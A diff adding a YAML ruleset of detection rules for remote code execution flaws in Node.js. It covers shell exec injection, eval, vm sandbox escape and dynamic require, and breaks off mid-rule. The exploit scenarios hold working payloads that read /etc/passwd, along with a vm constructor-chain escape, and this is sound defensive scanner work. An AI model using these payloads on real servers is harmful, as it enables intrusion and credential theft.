@@ -1,0 +1,1308 @@
+# ============================================================================
+# RCE Detection Rules - JavaScript / Node.js
+# Ruleset Version: 3.0.0
+# Last Updated: 2025-01-15
+# Category: Remote Code Execution (CWE-78, CWE-94, CWE-95)
+# Language: JavaScript / Node.js
+# ============================================================================
+
+rules:
+  # --------------------------------------------------------------------------
+  # RCE-JS-001: child_process.exec with user input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-001"
+    title: "child_process.exec with User-Controlled Input"
+    description: >
+      Detects usage of Node.js child_process.exec(), execSync(), and related
+      shell-execution functions where the command string includes user-controlled
+      input. Unlike execFile/spawn, exec() invokes a shell (/bin/sh or cmd.exe)
+      to interpret the command string, enabling shell metacharacter injection
+      (;, |, &&, ||, $(), backticks) for arbitrary command execution. This is
+      the most common and dangerous RCE vector in Node.js applications.
+    language: javascript
+    category: rce
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - command-injection
+      - child-process
+      - exec
+      - shell-injection
+      - nodejs
+      - os-command
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'child_process\s*\.\s*exec\s*\(\s*(?:[`\x27"].*?\$\{|.*?\+\s*)(?:req\.|ctx\.|params\.|query\.|body\.|userInput|data\.|input|cmd|command)'
+        description: "child_process.exec with template literal or concatenation containing user input"
+      - type: regex
+        pattern: 'exec\s*\(\s*[`\x27"](?:ls|cat|echo|ping|curl|wget|nslookup|dig|whoami|id|uname|ifconfig|netstat)\s+.*?\$\{(?:req\.|ctx\.|params\.|input|user|data)'
+        description: "exec with common OS command and user input interpolation"
+      - type: regex
+        pattern: 'execSync\s*\(\s*(?:[`\x27"].*?\$\{|.*?\+\s*)(?:req\.|ctx\.|params\.|query\.|body\.|userInput|input|cmd)'
+        description: "execSync with user-controlled input"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w*(?:cmd|command|shellCmd|exec)\w*\s*=\s*[`\x27"][^`\x27"]{0,100}(?:\$\{|[`\x27"]\s*\+\s*)(?:req\.|ctx\.|userInput|input|data\.)\w+'
+        description: "Command string built from user input then passed to exec"
+      - type: regex
+        pattern: 'require\s*\(\s*[`\x27"]child_process[`\x27"]\s*\)\s*\.\s*exec\s*\(\s*(?:req\.|ctx\.|data\.|input|cmd)'
+        description: "Direct require and exec with user input"
+      - type: regex
+        pattern: '(?:exec|execSync|spawnSync)\s*\(\s*(?:cmd|command|shellCmd|userCmd|input)\s*[,)]'
+        description: "Shell execution function with command variable from user input"
+      - type: regex
+        pattern: 'exec\s*\(\s*`(?:ping|nslookup|dig|traceroute|curl|wget)\s+\$\{(?:host|ip|domain|target|url|address|server)'
+        description: "Network utility command with user-controlled host parameter"
+      - type: regex
+        pattern: '(?:shelljs|shell)\s*\.\s*exec\s*\(\s*(?:[`\x27"].*?\$\{|.*?\+\s*)(?:req\.|ctx\.|input|user|data)'
+        description: "ShellJS exec with user-controlled input"
+    anti_patterns:
+      - 'exec\s*\(\s*[`\x27"][a-zA-Z/]+[`\x27"]\s*[,)]'
+      - 'exec\s*\(\s*[`\x27"](?:node|npm|npx|git|docker)\s+[^$`]*[`\x27"]\s*[,)]'
+      - 'child_process\s*\.\s*exec\s*\(\s*(?:COMMAND|CMD|SCRIPT|BIN_PATH)\s*[,)]'
+      - 'child_process\s*\.\s*exec\s*\(\s*(?:config|settings|process\.env)\s*\.'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\(\s*[`\x27"]child_process'
+      - '@jest'
+      - 'sinon\.\w+'
+      - 'mock\s*\(\s*[`\x27"]child_process'
+      - 'child_process\.execFile\s*\('
+      - 'child_process\.spawn\s*\('
+      - 'cross-spawn'
+      - 'execa\s*\('
+      - '(?:Makefile|Gruntfile|Gulpfile|webpack\.config)'
+    bypass_variants:
+      - description: "Command chaining via semicolon injection"
+        pattern: '(?:exec|execSync)\s*\(.*?(?:;|\||&&|\|\||`|\\$\\()'
+      - description: "Newline injection to break command boundary"
+        pattern: '(?:exec|execSync)\s*\(.*?(?:%0[aAdD]|\\n|\\r|\\x0[aAdD])'
+      - description: "Backtick command substitution"
+        pattern: '(?:exec|execSync)\s*\(.*?`[^`]+`'
+      - description: "Environment variable injection via $() or ${}"
+        pattern: '(?:exec|execSync)\s*\(.*?(?:\\$\\([^)]+\\)|\\$\\{[^}]+\\})'
+      - description: "Argument injection via -- or option flags"
+        pattern: '(?:exec|execSync)\s*\(.*?(?:--[a-z]+=|(?:^|\s)-[a-zA-Z])'
+    evasion_indicators:
+      - "Shell metacharacters (; | && || ` $())"
+      - "Newline/carriage return injection"
+      - "Backtick command substitution"
+      - "Double-encoding of special characters"
+      - "Whitespace alternatives (IFS, tabs)"
+      - "Wildcard expansion (* ? [])"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: '(?:exec|execSync)\s*\(.*?%(?:0[aAdD]|3[bB]|7[cC]|26|60)'
+      - type: "unicode_encoding"
+        pattern: '(?:exec|execSync)\s*\(.*?\\u(?:000[aAdD]|003[bB]|007[cC]|0060)'
+      - type: "hex_encoding"
+        pattern: '(?:exec|execSync)\s*\(.*?\\x(?:0[aAdD]|3[bB]|7[cC]|60)'
+      - type: "octal_encoding"
+        pattern: '(?:exec|execSync)\s*\(.*?\\(?:012|015|073|174)'
+    multi_function_chain_patterns:
+      - "req.query.host -> template literal -> exec(`ping ${host}`)"
+      - "req.body.filename -> string concatenation -> exec('convert ' + filename)"
+      - "req.params.domain -> command construction -> execSync(cmd)"
+      - "user input -> sanitize (insufficient) -> shell command -> exec()"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "OS command execution enables full system compromise from web application context"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query.host"
+        sink: "exec(`ping ${host}`)"
+        through: "template literal interpolation"
+      - source: "req.body.filename"
+        sink: "exec('convert ' + filename + ' output.png')"
+        through: "string concatenation in command"
+      - source: "req.params.domain"
+        sink: "execSync(`nslookup ${domain}`)"
+        through: "route parameter to shell command"
+    impact: |
+      - Full remote code execution on the server.
+      - Complete system compromise with application's OS privileges.
+      - Data exfiltration from the server filesystem and databases.
+      - Lateral movement to other systems on the internal network.
+      - Installation of backdoors, cryptominers, or ransomware.
+      - Denial of service through resource exhaustion or system destruction.
+    remediation: |
+      1. Use execFile or spawn instead of exec to avoid shell interpretation:
+         ```javascript
+         const { execFile } = require('child_process');
+
+         // SAFE: execFile does not invoke a shell
+         execFile('ping', ['-c', '4', userHost], (error, stdout) => {
+           if (error) {
+             console.error('Ping failed:', error.message);
+             return;
+           }
+           console.log(stdout);
+         });
+
+         // For complex cases, validate input strictly
+         function safePing(host) {
+           // Validate: only allow hostnames and IPs
+           const hostRegex = /^[a-zA-Z0-9][a-zA-Z0-9.-]+[a-zA-Z0-9]$/;
+           if (!hostRegex.test(host) || host.length > 253) {
+             throw new Error('Invalid hostname');
+           }
+           return execFileSync('ping', ['-c', '4', host]);
+         }
+         ```
+      2. Never construct shell commands from user input via string concatenation.
+      3. Use allowlist validation for user-provided command arguments.
+      4. Apply principle of least privilege to the application's OS user.
+      5. Use containerization to limit blast radius of command execution.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://nodejs.org/api/child_process.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\(\s*[`\x27"]child_process[`\x27"]\s*\)'
+        - 'import\s+.*\s+from\s+[`\x27"]child_process[`\x27"]'
+        - 'app\.(get|post|put|delete)\s*\('
+        - 'router\.\w+\s*\('
+        - 'async\s+function\s+\w+\s*\(req'
+      taint_source_indicators:
+        - 'req\.query\.\w+'
+        - 'req\.body\.\w+'
+        - 'req\.params\.\w+'
+        - 'req\.headers\[.*?\]'
+        - 'ctx\.request\.body\.\w+'
+      taint_sink_indicators:
+        - 'exec\s*\('
+        - 'execSync\s*\('
+        - 'child_process\.exec\s*\('
+        - 'shelljs\.exec\s*\('
+        - 'shell\.exec\s*\('
+      sanitization_patterns:
+        - 'shell-escape'
+        - 'shellescape'
+        - 'escapeshellarg'
+        - 'execFile\s*\('
+        - 'spawn\s*\('
+        - 'allowlist.*test\s*\('
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + shell_access_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Node.js application provides a network diagnostic endpoint:
+
+        app.get('/api/ping', (req, res) => {
+          const host = req.query.host;
+          exec(`ping -c 4 ${host}`, (error, stdout) => {
+            res.json({ result: stdout });
+          });
+        });
+
+        Attacker sends:
+        GET /api/ping?host=8.8.8.8;cat%20/etc/passwd
+
+        The server executes: ping -c 4 8.8.8.8;cat /etc/passwd
+        This runs both commands and returns /etc/passwd contents.
+      example_payload: "8.8.8.8;cat /etc/passwd"
+      attacker_objective: "Execute arbitrary OS commands on the server"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-002"
+        - "RCE-JS-003"
+        - "RCE-JS-006"
+
+  # --------------------------------------------------------------------------
+  # RCE-JS-002: eval/Function constructor with user input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-002"
+    title: "eval() / Function Constructor with User-Controlled Input"
+    description: >
+      Detects usage of JavaScript's eval(), Function constructor, setTimeout/
+      setInterval with string argument, and other dynamic code evaluation
+      mechanisms where the evaluated code is derived from user-controlled
+      input. These functions compile and execute arbitrary JavaScript code,
+      enabling an attacker to execute any server-side code including file
+      system access, network requests, and process management.
+    language: javascript
+    category: rce
+    severity: Critical
+    confidence: 0.94
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - eval
+      - function-constructor
+      - code-injection
+      - dynamic-evaluation
+      - nodejs
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:req\.|ctx\.|params\.|query\.|body\.|userInput|data\.|input|expr|expression|code|script|formula|calc)'
+        description: "eval() with user-controlled input variable"
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:[`\x27"].*?\$\{|.*?\+\s*)(?:req\.|ctx\.|input|user|data|body|query|params)'
+        description: "eval() with template literal or concatenation of user input"
+      - type: regex
+        pattern: 'new\s+Function\s*\(\s*(?:req\.|ctx\.|params\.|body\.|userInput|data\.|input|code|script|expr|expression)'
+        description: "Function constructor with user-controlled code"
+      - type: regex
+        pattern: 'new\s+Function\s*\(\s*[`\x27"].*?[`\x27"]\s*,\s*(?:req\.|ctx\.|body\.|code|script|expr|input)'
+        description: "Function constructor with user-controlled body argument"
+      - type: regex
+        pattern: 'setTimeout\s*\(\s*(?:req\.|ctx\.|body\.|userInput|data\.|input|code|expr)\s*[\.\[,]'
+        description: "setTimeout with string argument from user input"
+      - type: regex
+        pattern: 'setInterval\s*\(\s*(?:req\.|ctx\.|body\.|userInput|data\.|input|code|expr)\s*[\.\[,]'
+        description: "setInterval with string argument from user input"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w*(?:code|script|expr|expression|formula|calc)\w*\s*=\s*(?:req\.|ctx\.)(?:body|query|params)[\s\S]{0,200}eval\s*\('
+        description: "Code variable from request used shortly after in eval"
+      - type: regex
+        pattern: '(?:vm\.runInContext|vm\.runInNewContext|vm\.runInThisContext|vm\.compileFunction)\s*\(\s*(?:req\.|ctx\.|code|script|expr|input|userInput)'
+        description: "vm module execution with user-controlled code"
+    anti_patterns:
+      - 'eval\s*\(\s*[`\x27"][^`\x27"]+[`\x27"]\s*\)'
+      - 'eval\s*\(\s*JSON\.(?:parse|stringify)\s*\('
+      - 'eval\s*\(\s*(?:config|settings|Constants)\s*\.'
+      - 'new\s+Function\s*\(\s*[`\x27"]return\s+[^`\x27"]+[`\x27"]\s*\)'
+      - '(?://|/\*)\s*(?:eslint-disable|tslint:disable|jshint|noinspection).*?(?:no-eval|eval)'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\('
+      - '@jest'
+      - 'expect\s*\(\s*\(\s*\)\s*=>'
+      - 'chai\.\w+'
+      - 'sinon\.\w+'
+      - '(?://|/\*)\s*(?:TODO|FIXME|HACK).*eval'
+      - 'angular\..*\$eval'
+      - 'webpack.*eval'
+    bypass_variants:
+      - description: "Indirect eval via window/global reference"
+        pattern: '(?:global|globalThis|window)\s*\[\s*[`\x27"]eval[`\x27"]\s*\]\s*\('
+      - description: "eval via computed property access"
+        pattern: '(?:this|self|global)\s*\[\s*(?:req\.|ctx\.|[`\x27"]eval[`\x27"])\s*\]'
+      - description: "Obfuscated Function constructor access"
+        pattern: '(?:\[?\]\.constructor\.constructor|\(\s*\)\s*=>\s*\{\s*\}\.constructor)\s*\('
+      - description: "eval via import() dynamic import"
+        pattern: 'import\s*\(\s*(?:req\.|ctx\.|data\.|input|code)\s*[\.\[]'
+      - description: "Indirect eval via (0, eval)(code)"
+        pattern: '\(\s*0\s*,\s*eval\s*\)\s*\(\s*(?:req\.|ctx\.|code|input)'
+    evasion_indicators:
+      - "Indirect eval via bracket notation"
+      - "eval alias through variable assignment"
+      - "Function constructor via prototype chain"
+      - "setTimeout/setInterval with string first argument"
+      - "Dynamic import() with user-controlled path"
+      - "Constructor chain (e.g., [].constructor.constructor)"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: 'eval\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "hex_escape"
+        pattern: 'eval\s*\(.*?\\x[0-9A-Fa-f]{2}'
+      - type: "base64_decode"
+        pattern: 'eval\s*\(\s*(?:atob|Buffer\.from)\s*\('
+      - type: "string_fromcharcode"
+        pattern: 'eval\s*\(\s*String\.fromCharCode\s*\('
+    multi_function_chain_patterns:
+      - "req.body.expression -> eval(expression) -> result returned to user"
+      - "req.body.code -> new Function(code)() -> code execution"
+      - "req.query.calc -> eval('(' + calc + ')') -> computed result"
+      - "user input -> base64 decode -> eval(decoded) -> arbitrary code execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "JavaScript eval enables full Node.js runtime access including require() for OS commands"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.expression"
+        sink: "eval(expression)"
+        through: "direct body parameter to eval"
+      - source: "req.body.code"
+        sink: "new Function(code)()"
+        through: "code string to Function constructor"
+      - source: "req.query.formula"
+        sink: "eval(formula)"
+        through: "query parameter to eval for calculation"
+    impact: |
+      - Full remote code execution in the Node.js process context.
+      - Access to require() enabling OS command execution (require('child_process')).
+      - File system read/write via require('fs').
+      - Network access for lateral movement and data exfiltration.
+      - Process control including termination of the server.
+      - Complete server compromise.
+    remediation: |
+      1. Never use eval() or Function constructor with user input:
+         ```javascript
+         // UNSAFE: eval with user input
+         // const result = eval(req.body.expression);
+
+         // SAFE: Use a math expression parser for calculations
+         const mathjs = require('mathjs');
+         const result = mathjs.evaluate(req.body.expression, {});
+
+         // SAFE: Use a sandboxed evaluator for templates
+         const Handlebars = require('handlebars');
+         const template = Handlebars.compile(templateString);
+         const result = template(data);
+
+         // SAFE: Use JSON.parse for data parsing
+         const data = JSON.parse(req.body.jsonData);
+         ```
+      2. Use specialized libraries (math.js, expr-eval) for expression evaluation.
+      3. Use template engines (Handlebars, EJS with strict mode) for dynamic content.
+      4. If code execution is required, use vm2 with strict sandboxing (with caveats).
+      5. Implement Content Security Policy to prevent client-side eval.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'app\.(get|post|put|delete)\s*\('
+        - 'router\.\w+\s*\('
+        - 'async\s+function\s+\w+\s*\(req'
+        - 'exports\.\w+\s*='
+        - 'module\.exports'
+      taint_source_indicators:
+        - 'req\.body\.\w+'
+        - 'req\.query\.\w+'
+        - 'req\.params\.\w+'
+        - 'ctx\.request\.body\.\w+'
+        - 'event\.body'
+      taint_sink_indicators:
+        - 'eval\s*\('
+        - 'new\s+Function\s*\('
+        - 'setTimeout\s*\(\s*[`\x27"]'
+        - 'setInterval\s*\(\s*[`\x27"]'
+        - 'vm\.run'
+      sanitization_patterns:
+        - 'mathjs\.evaluate\s*\('
+        - 'expr-eval'
+        - 'safe-eval'
+        - 'JSON\.parse\s*\('
+        - 'allowlist.*test\s*\('
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + nodejs_runtime_access)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Node.js calculator API uses eval for expression evaluation:
+
+        app.post('/api/calculate', (req, res) => {
+          const expression = req.body.expression;
+          const result = eval(expression);
+          res.json({ result });
+        });
+
+        Attacker sends:
+        POST /api/calculate
+        Body: {"expression": "require('child_process').execSync('cat /etc/passwd').toString()"}
+
+        The server evaluates the code and returns /etc/passwd contents.
+      example_payload: "require('child_process').execSync('id').toString()"
+      attacker_objective: "Execute arbitrary JavaScript code on the server"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-001"
+        - "RCE-JS-003"
+        - "RCE-JS-004"
+
+  # --------------------------------------------------------------------------
+  # RCE-JS-003: vm module sandbox escape
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-003"
+    title: "Node.js vm Module Sandbox Escape"
+    description: >
+      Detects usage of Node.js vm module (vm.runInNewContext, vm.Script,
+      vm.createContext) with user-controlled code. The vm module does NOT
+      provide a secure sandbox -- it is explicitly documented as not being
+      a security mechanism. Attackers can escape the vm context to access
+      the host Node.js process via constructor chain traversal, prototype
+      pollution, or direct process/require access.
+    language: javascript
+    category: rce
+    severity: High
+    confidence: 0.93
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - vm-module
+      - sandbox-escape
+      - code-injection
+      - nodejs
+      - security-boundary
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'vm\s*\.\s*runInNewContext\s*\(\s*(?:req\.|ctx\.|body\.|code|script|expr|input|userInput|data\.)'
+        description: "vm.runInNewContext with user-controlled code"
+      - type: regex
+        pattern: 'vm\s*\.\s*runInThisContext\s*\(\s*(?:req\.|ctx\.|body\.|code|script|expr|input|userInput|data\.)'
+        description: "vm.runInThisContext with user-controlled code (most dangerous)"
+      - type: regex
+        pattern: 'vm\s*\.\s*runInContext\s*\(\s*(?:req\.|ctx\.|body\.|code|script|expr|input|userInput|data\.)'
+        description: "vm.runInContext with user-controlled code"
+      - type: regex
+        pattern: 'new\s+vm\s*\.\s*Script\s*\(\s*(?:req\.|ctx\.|body\.|code|script|expr|input|userInput|data\.)'
+        description: "vm.Script constructed with user-controlled code"
+      - type: regex
+        pattern: 'vm\s*\.\s*compileFunction\s*\(\s*(?:req\.|ctx\.|body\.|code|script|expr|input|userInput|data\.)'
+        description: "vm.compileFunction with user-controlled code"
+      - type: regex
+        pattern: 'vm2\s*\.\s*(?:VM|NodeVM|VMScript)\s*[\s\S]{0,200}\.run\s*\(\s*(?:req\.|ctx\.|code|script|input|userInput)'
+        description: "vm2 library execution with user-controlled code"
+      - type: regex
+        pattern: 'isolated-vm[\s\S]{0,200}\.(?:compileScript|run|eval)\s*\(\s*(?:req\.|ctx\.|code|script|input)'
+        description: "isolated-vm with user-controlled code"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w*(?:code|script|expr)\w*\s*=\s*(?:req\.|ctx\.)(?:body|query|params)[\s\S]{0,300}vm\s*\.\s*(?:runIn|Script|compileFunction)'
+        description: "Code from request used in vm module execution"
+    anti_patterns:
+      - 'vm\s*\.\s*runInNewContext\s*\(\s*[`\x27"][^`\x27"]*[`\x27"]'
+      - 'vm\s*\.\s*runInNewContext\s*\(\s*(?:SCRIPT|CODE|EXPRESSION|Constants\.)'
+      - 'new\s+vm\s*\.\s*Script\s*\(\s*[`\x27"][^$`]*[`\x27"]'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\('
+      - '@jest'
+      - '@Test'
+      - 'sinon\.\w+'
+      - 'expect\s*\('
+      - 'vm\s*\.\s*createContext\s*\(\s*\{\s*\}\s*\)'
+      - '(?://|/\*)\s*(?:security|WARNING|DANGER|UNSAFE).*vm'
+      - 'vm\s*\.\s*measureMemory'
+      - 'vm\s*\.\s*SourceTextModule'
+      - '(?:webpack|rollup|esbuild|vite).*vm'
+    bypass_variants:
+      - description: "Constructor chain escape: this.constructor.constructor('return process')()"
+        pattern: '(?:constructor\.constructor|__proto__|prototype)\s*[\.\(]'
+      - description: "Proxy-based sandbox escape"
+        pattern: 'new\s+Proxy\s*\(\s*(?:target|this|global)'
+      - description: "Exception-based escape via error.constructor"
+        pattern: '(?:Error|TypeError|RangeError)\s*\(\s*\)\.constructor\.constructor\s*\('
+      - description: "arguments.callee-based escape"
+        pattern: 'arguments\s*\.\s*(?:callee|caller)\s*\.\s*constructor'
+      - description: "SharedArrayBuffer-based escape"
+        pattern: 'SharedArrayBuffer\s*\(\s*\)[\s\S]{0,200}(?:Atomics|Worker)'
+    evasion_indicators:
+      - "Prototype chain traversal to access process/require"
+      - "Constructor chain: this.constructor.constructor"
+      - "Error object constructor chain escape"
+      - "Proxy handler escaping sandbox boundaries"
+      - "Symbol.toPrimitive abuse"
+      - "WeakRef/FinalizationRegistry escape (newer Node)"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: 'vm\.\w+\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "hex_escape"
+        pattern: 'vm\.\w+\s*\(.*?\\x[0-9A-Fa-f]{2}'
+      - type: "base64_decode"
+        pattern: 'vm\.\w+\s*\(\s*Buffer\.from\s*\('
+    multi_function_chain_patterns:
+      - "req.body.code -> vm.runInNewContext(code, context) -> escape via constructor chain"
+      - "user input -> vm.Script(code) -> script.runInContext(sandbox) -> escape"
+      - "req.query.expression -> vm.compileFunction(expression) -> execution"
+      - "user code -> vm2.VM().run(code) -> CVE-based escape"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "vm sandbox escape grants full Node.js process access including OS commands"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.code"
+        sink: "vm.runInNewContext(code, sandbox)"
+        through: "user code to vm context with escapable sandbox"
+      - source: "req.body.expression"
+        sink: "new vm.Script(expression).runInContext(ctx)"
+        through: "expression to vm.Script with breakable context"
+      - source: "req.body.script"
+        sink: "vm2.VM().run(script)"
+        through: "user script to vm2 (known CVEs for escape)"
+    impact: |
+      - Full remote code execution via sandbox escape.
+      - Access to Node.js process object (process.env, process.exit).
+      - Ability to require() any module including child_process.
+      - File system access via require('fs').
+      - Complete server compromise.
+      - Known CVEs in vm2 enabling reliable sandbox escapes.
+    remediation: |
+      1. Do NOT use the vm module for untrusted code execution:
+         ```javascript
+         // UNSAFE: vm module is NOT a security boundary
+         // vm.runInNewContext(userCode, sandbox);
+
+         // Option 1: Use a purpose-built safe expression evaluator
+         const { Parser } = require('expr-eval');
+         const parser = new Parser();
+         const result = parser.evaluate(userExpression, variables);
+
+         // Option 2: Use WebAssembly-based sandbox (e.g., QuickJS-emscripten)
+         const { getQuickJS } = require('quickjs-emscripten');
+         const QuickJS = await getQuickJS();
+         const vm = QuickJS.newContext();
+         const result = vm.evalCode(userCode);
+         vm.dispose();
+
+         // Option 3: Use a separate process with resource limits
+         const { Worker } = require('worker_threads');
+         // Run in isolated worker with limited permissions
+         ```
+      2. Use isolated-vm with strict memory and time limits if code execution is needed.
+      3. Consider server-side WebAssembly sandboxes (QuickJS, Wasmer).
+      4. Run untrusted code in separate containerized processes.
+      5. Never trust vm/vm2 as security boundaries.
+    references:
+      - "https://nodejs.org/api/vm.html#vm-executing-javascript"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://github.com/nicktate/vm2-security-research"
+      - "https://www.npmjs.com/package/vm2#known-issues"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\(\s*[`\x27"]vm[`\x27"]\s*\)'
+        - 'import\s+.*\s+from\s+[`\x27"]vm[`\x27"]'
+        - 'require\s*\(\s*[`\x27"]vm2[`\x27"]\s*\)'
+        - 'app\.(get|post)\s*\('
+      taint_source_indicators:
+        - 'req\.body\.(?:code|script|expression|formula)'
+        - 'req\.query\.(?:code|expr|expression)'
+        - 'ctx\.request\.body\.(?:code|script)'
+        - 'event\.body'
+      taint_sink_indicators:
+        - 'vm\.runInNewContext\s*\('
+        - 'vm\.runInThisContext\s*\('
+        - 'vm\.runInContext\s*\('
+        - 'new\s+vm\.Script\s*\('
+        - 'vm\.compileFunction\s*\('
+      sanitization_patterns:
+        - 'expr-eval'
+        - 'mathjs\.evaluate'
+        - 'isolated-vm'
+        - 'quickjs-emscripten'
+        - 'safe.*eval'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * sandbox_escape_reliability"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A code playground uses the vm module for "safe" execution:
+
+        app.post('/api/execute', (req, res) => {
+          const sandbox = { result: null };
+          vm.createContext(sandbox);
+          vm.runInContext(req.body.code, sandbox, { timeout: 1000 });
+          res.json({ result: sandbox.result });
+        });
+
+        Attacker sends:
+        POST /api/execute
+        Body: {"code": "const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('id').toString()"}
+
+        The code escapes the vm sandbox and executes OS commands.
+      example_payload: "this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id').toString()"
+      attacker_objective: "Escape vm sandbox to achieve full remote code execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-001"
+        - "RCE-JS-002"
+        - "RCE-JS-006"
+
+  # --------------------------------------------------------------------------
+  # RCE-JS-004: Dynamic require/import with user-controlled path
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-004"
+    title: "Dynamic require()/import() with User-Controlled Path"
+    description: >
+      Detects usage of Node.js require() or dynamic import() where the module
+      path is derived from user-controlled input. An attacker can manipulate
+      the path to load arbitrary modules from the filesystem, including native
+      modules that execute code upon loading, or modules in node_modules that
+      provide dangerous functionality. Path traversal can be used to reach
+      modules outside the intended directory.
+    language: javascript
+    category: rce
+    severity: High
+    confidence: 0.88
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - require
+      - dynamic-import
+      - path-traversal
+      - module-loading
+      - nodejs
+      - code-injection
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'require\s*\(\s*(?:req\.|ctx\.|params\.|body\.|query\.|userInput|data\.|input|moduleName|pluginName|name)'
+        description: "require() with user-controlled module path"
+      - type: regex
+        pattern: 'require\s*\(\s*[`\x27"].*?\$\{(?:req\.|ctx\.|name|module|plugin|input|user|data)'
+        description: "require() with template literal containing user input"
+      - type: regex
+        pattern: 'require\s*\(\s*(?:[`\x27"].*?[`\x27"]\s*\+\s*)(?:req\.|ctx\.|name|module|plugin|input|data)'
+        description: "require() with string concatenation of user input"
+      - type: regex
+        pattern: 'import\s*\(\s*(?:req\.|ctx\.|params\.|body\.|query\.|userInput|data\.|input|modulePath|pluginPath)'
+        description: "Dynamic import() with user-controlled path"
+      - type: regex
+        pattern: 'import\s*\(\s*[`\x27"].*?\$\{(?:req\.|ctx\.|name|module|plugin|input|user|data)'
+        description: "Dynamic import() with template literal containing user input"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w+\s*=\s*require\s*\(\s*(?:path\.join|path\.resolve)\s*\([^)]*(?:req\.|ctx\.|input|data|name|user)'
+        description: "require with path.join/resolve containing user input"
+      - type: regex
+        pattern: 'require\s*\(\s*(?:path\.join|path\.resolve)\s*\(\s*__dirname\s*,\s*(?:req\.|ctx\.|input|data|name|module|plugin|userInput)'
+        description: "require with __dirname and user-controlled path component"
+      - type: regex
